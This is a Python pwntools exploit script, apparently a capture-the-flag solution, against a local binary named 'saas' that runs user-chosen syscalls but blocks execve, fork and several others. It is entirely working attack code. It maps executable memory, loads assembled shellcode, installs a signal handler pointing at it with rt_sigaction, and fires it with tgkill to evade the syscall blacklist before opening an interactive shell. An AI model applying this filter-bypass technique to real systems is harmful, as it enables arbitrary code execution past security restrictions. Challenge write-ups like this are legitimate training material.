#!/usr/bin/env python3

import os
from pwn import *

BLACKLIST = [59, 57, 56, 62, 101, 200, 322]

def make_syscall(rax, rdi=0, rsi=0, rdx=0, r10=0, r8=0, r9=0, content=None, no_return=False):
    assert(rax not in BLACKLIST)
    
    conn.sendafter(b": ", f"{rax}\n")
    conn.sendafter(b": ", f"{rdi}\n")
    conn.sendafter(b": ", f"{rsi}\n")
    conn.sendafter(b": ", f"{rdx}\n")
    conn.sendafter(b": ", f"{r10}\n")
    conn.sendafter(b": ", f"{r9}\n")
    conn.sendafter(b": ", f"{r8}\n")
    
    if content is not None:
        conn.send(content)
    
    if not no_return:
        conn.recvuntil(b"Rax: ")
        return int(conn.recvline().decode(), base=16)

with process("./saas") as conn:
    # Place shellcode into memory
    if os.system("nasm -f bin -o shellcode.bin shellcode.asm"):
        log.error("Could not compile shellcode")
    
    shellcode = open("shellcode.bin", "rb").read()
    assert(0xa not in shellcode)
    
    shellcode_loc = make_syscall(9, 0, len(shellcode), 7, 34, -1, 0)
    log.info(f"Shellcode @ {hex(shellcode_loc)}")
    
    if make_syscall(0, 0, shellcode_loc, len(shellcode), content=shellcode) != len(shellcode):
        log.error("Didn't read shellcode completely")
        
    # Place sigaction into memory
    signal = 1
    sigaction = p64(shellcode_loc) + p64(0x0000000004000000) + p64(shellcode_loc) + p64(0)
    sigaction_loc = make_syscall(9, 0, len(sigaction), 7, 34, -1, 0)
    log.info(f"Sigaction @ {hex(sigaction_loc)}")
    
    if make_syscall(0, 0, sigaction_loc, len(sigaction), content=sigaction) != len(sigaction):
        log.error("Didn't read sigaction completely")
    
    # Install signal handler
    if make_syscall(13, signal, sigaction_loc, 0, 8) != 0:
        log.error("Installing signal handler failed")
    
    # Trigger signal handler
    pid = make_syscall(39)
    if pid >= 0x8000000000000000:
        log.error("Could not get process id")
    log.info(f"pid = {pid}")
    
    make_syscall(234, pid, pid, signal, no_return=True)
    conn.interactive()
